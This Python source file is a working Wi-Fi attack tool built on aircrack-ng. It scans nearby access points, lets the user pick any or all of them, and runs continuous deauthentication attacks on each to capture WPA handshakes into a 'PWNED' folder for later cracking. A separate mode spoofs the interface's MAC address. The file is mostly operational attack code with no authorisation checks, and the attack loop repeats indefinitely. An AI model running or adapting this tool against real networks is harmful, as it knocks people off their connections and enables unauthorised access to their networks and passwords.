import subprocess
import time
import math
import sys
import csv
import json
import os
import menu
import dependency



#===================
#=====FUNCTIONS=====
#===================
def interface(enable_monitor_option=True):
    # run iwconfig to list wireless interfaces
    p1 = subprocess.run("iwconfig", capture_output=True, text=True)

    # filter output to interface names only
    interfaces = []

    for line in p1.stdout.splitlines():
        if line and not line.startswith(" "):
            interfaces.append(line.split()[0])

    # enumerate and display available interfaces
    for index, interface in enumerate(interfaces):
        print(f"{index + 1}: {interface}")

    if len(interfaces) == 0:
        print("No interfaces found!")
        sys.exit()

    select_input = int(input("Select your interface: \n"))
    selected_interface = interfaces[select_input - 1]

    print(f"Interface {selected_interface} set")

    if enable_monitor_option:
        mode_switch = str(input("Switch to monitor mode? [yes/no]\n"))

        # kill conflicting processes and switch the interface to monitor mode
        if mode_switch == "yes":
            p2 = subprocess.run(["sudo", "airmon-ng", "check", "kill"], capture_output=True, text=True)
            print(p2.stdout)
            p3 = subprocess.run(["sudo", "airmon-ng", "start", selected_interface], capture_output=True, text=True)
            print(p3.stdout)
        else:
            print("Monitor mode is not active. Type 'yes' next time to enable it.")

    return selected_interface

# scan networks and save discovered APs to file
def scanning(interface_name):
    scanning_time = float(input("Select scanning time in secounds\n"))
    print(f"Starting network scan on {interface_name}")


    p4 = subprocess.Popen(["sudo", "airodump-ng", "-w", "networks_in_range", interface_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    start_time = time.time()
    print("Scanning Networks...")

    while True:
        end_time = math.floor(time.time() - start_time)
        print(f"Ellapsed time: {end_time} / {int(scanning_time)}s   ", end='\r', flush=True)
        if time.time() - start_time >= scanning_time:
            print()
            print("Scan finished")
            break
        time.sleep(1)

    p4.terminate()
    stdout, stderr = p4.communicate()

    print("Select networks for attack in loop: ")
    print(stdout)

    with open("networks_in_range-01.csv", "r") as file:
        networks = csv.reader(file)
        all_networks = []

        network_id = 1
        for row in networks:
            if not row:
                continue

            # skip CSV header row
            if row[0].strip() == "BSSID":
                continue

            # end of AP section
            if row[0].strip() == "Station MAC":
                break

            if len(row) < 14:
                continue


            bssid    = row[0].strip()
            channel  = row[3].strip()
            auth     = row[5].strip() or "OPEN"
            power    = row[8].strip()
            key      = row[13].strip() or "hidden"

            if not key or key == "hidden":
                continue

            try:
                power_int = int(power)
            except ValueError:
                power_int = -999

            all_networks.append({
                "bssid": bssid,
                "channel": channel,
                "auth": auth,
                "power": power,
                "key": key
            })

        all_networks.sort(key=lambda x: x["power"], reverse=True)

        os.system("clear")

        network_id = 1
        for net in all_networks:
            print(f"[{network_id:>3}] | {net['key']:<28} | CH:{net['channel']:>3} | PWR:{net['power']:>4} | BSSID:{net['bssid']} | {net['auth']}")
            network_id += 1

        with open("networks_in_range.json", "w", encoding="utf-8") as json_file:
            json.dump(all_networks, json_file, indent=4, ensure_ascii=False)

        if os.path.exists("networks_in_range-01.cap"):
            os.remove("networks_in_range-01.cap") 
            os.remove("networks_in_range-01.csv") 
            os.remove("networks_in_range-01.kismet.csv")
            os.remove("networks_in_range-01.kismet.netxml") 
            os.remove("networks_in_range-01.log.csv")
        else:
            print("Failed to clear .csv files after airodump, please do it manually")

def attack(interface_name, attack_time, selected_networks, captured_bssids, successful_handshakes):

    # filter out already captured networks for this pass
    remaining = [net for net in selected_networks if net["bssid"] not in captured_bssids]

    if not remaining:
        print("All selected networks already have captured handshakes.")
        return

    print(f"\n[PASS] Attacking {len(remaining)} remaining network(s) (skipping {len(captured_bssids)} already captured):")

    for i, net in enumerate(remaining):
        bssid   = net["bssid"]
        channel = net["channel"]
        key     = net["key"]

        #skip networks where handshake was already captured
        if bssid in captured_bssids:
            print(f"[SKIP] {key} ({bssid}) - handshake already captured, skipping")
            continue

        print(f"\n[{i + 1}/{len(remaining)}] Attacking: {key:<28} | CH:{channel:>3} | BSSID:{bssid}")

        safe_key = "".join(c if c.isalnum() or c in ("-", "_") else "_" for c in key)
        os.makedirs("PWNED", exist_ok=True)
        output_prefix = f"PWNED/capture_{safe_key}"

        #start airodump-ng to capture handshake on target channel and bssid
        p5 = subprocess.Popen(
            ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", output_prefix, interface_name],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        #start aireplay-ng with continuous deauthentication of network clients
        p6 = subprocess.Popen(
            ["sudo", "aireplay-ng", "--deauth", "0", "-a", bssid, interface_name],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

        start_time = time.time()
        print("Deauth attack in progress...")

        while True:
            end_time = math.floor(time.time() - start_time)
            print(f"Ellapsed time: {end_time} / {attack_time}s   ", end='\r', flush=True)
            if time.time() - start_time >= attack_time:
                print()
                print("Attack time elapsed")
                break
            time.sleep(1)

        #stop both processes after attack time
        p5.terminate()
        p6.terminate()
        p5.communicate()
        p6.communicate()

        cap_file = f"{output_prefix}-01.cap"

        #verify if handshake was captured using aircrack-ng
        if os.path.exists(cap_file):
            check = subprocess.run(["aircrack-ng", cap_file], capture_output=True, text=True)
            if "1 handshake" in check.stdout:
                print(f"[OK] Handshake captured: {key} ({bssid}) -> {cap_file}")
                captured_bssids.add(bssid)
                successful_handshakes.append({"key": key, "bssid": bssid, "cap": cap_file})
                #keep .cap file for later cracking, remove only auxiliary files
                for ext in ["-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
                    if os.path.exists(f"{output_prefix}{ext}"):
                        os.remove(f"{output_prefix}{ext}")
            else:
                print(f"[MISS] No handshake: {key} ({bssid}), removing files...")
                for ext in ["-01.cap", "-01.csv", "-01.kismet.csv", "-01.kismet.netxml", "-01.log.csv"]:
                    if os.path.exists(f"{output_prefix}{ext}"):
                        os.remove(f"{output_prefix}{ext}")
        else:
            print(f"[MISS] .cap file was not created for {key} ({bssid})")

    # print pass summary
    print("\n=== Attack summary ===")
    if successful_handshakes:
        for h in successful_handshakes:
            print(f"[+] {h['key']:<28} | BSSID:{h['bssid']} | File: {h['cap']}")
    else:
        print("No handshakes captured")

    print(f"\nAvailable networks for attack:")
    for idx, net in enumerate(selected_networks):
        status = "[captured]" if net["bssid"] in captured_bssids else ""
        print(f"[{idx + 1:>3}] | {net['key']:<28} | CH:{net['channel']:>3} | PWR:{net['power']:>4} | BSSID:{net['bssid']} | {net['auth']} {status}")


def change_mac(interface_name):
    # bring interface down before changing MAC
    p_down = subprocess.run(["sudo", "ip", "link", "set", interface_name, "down"], capture_output=True, text=True)
    if p_down.returncode != 0:
        print(f"[ERROR] Failed to bring down interface {interface_name}: {p_down.stderr}")
        return

    # change MAC address to a random one
    p7 = subprocess.run(["sudo", "macchanger", "-r", interface_name], capture_output=True, text=True)
    print(p7.stdout)
    if p7.returncode != 0:
        print(f"[ERROR] macchanger: {p7.stderr}")

    # bring interface back up
    p_up = subprocess.run(["sudo", "ip", "link", "set", interface_name, "up"], capture_output=True, text=True)
    if p_up.returncode != 0:
        print(f"[ERROR] Failed to bring up interface {interface_name}: {p_up.stderr}")



#===================
#=======MAIN========
#===================
menu.macchanger_switch = False
dependency.dependency_check()
while True:

    mode_select = menu.menu()

    if mode_select == 0:
        print("Exiting. Goodbye.")
        sys.exit()

    #attack mode
    elif mode_select == 1:
        selected_interface = interface()

        if os.path.exists("networks_in_range.json"):
            os.remove("networks_in_range.json")
        else:
            print("No leftover scan files found, proceeding to scan.")

        scanning(selected_interface)

        attack_time = int(input("Select attack time in seconds for each network\n"))

        # load and select networks ONCE before the attack loop
        with open("networks_in_range.json", "r", encoding="utf-8") as json_file:
            networks = json.load(json_file)

        os.system("clear")

        print("\nAvailable networks for attack:")
        for idx, net in enumerate(networks):
            print(f"[{idx + 1:>3}] | {net['key']:<28} | CH:{net['channel']:>3} | PWR:{net['power']:>4} | BSSID:{net['bssid']} | {net['auth']}")

        raw_selection = input("\nSelect networks to attack (numbers separated by commas, or 'all'): ").strip()
        if raw_selection.lower() == "all":
            selected_networks = networks
        else:
            selected_networks = []
            for token in raw_selection.split(","):
                token = token.strip()
                if token.isdigit():
                    idx = int(token) - 1
                    if 0 <= idx < len(networks):
                        selected_networks.append(networks[idx])
                    else:
                        print(f"[WARN] Number {token} out of range, skipping")
                else:
                    print(f"[WARN] '{token}' is not a number, skipping")

        if not selected_networks:
            print("No networks selected. Returning to menu.")
            continue

        os.system("clear")

        print(f"\nSelected {len(selected_networks)} network(s) for attack:")
        for net in selected_networks:
            print(f"  - {net['key']:<28} | BSSID:{net['bssid']}")

        confirm = input("\nAre you sure you want to start the attack? [yes/no]: ").strip().lower()
        if confirm != "yes":
            print("Attack cancelled.")
            continue

        # persistent state across all passes
        captured_bssids = set()
        successful_handshakes = []

        while True:
            attack(selected_interface, attack_time, selected_networks, captured_bssids, successful_handshakes)
    #macchanger mode
    elif mode_select == 2:
        

        selected_interface = interface(enable_monitor_option=False)

        # check if the interface is currently in monitor mode - macchanger requires managed mode
        iw_check = subprocess.run(["iwconfig", selected_interface], capture_output=True, text=True)
        if "Mode:Monitor" in iw_check.stdout:
            print(f"[WARN] {selected_interface} is in monitor mode. MAC spoofing requires managed mode. Returning to menu.")
            continue

        change_mac(selected_interface)
        menu.macchanger_switch = True








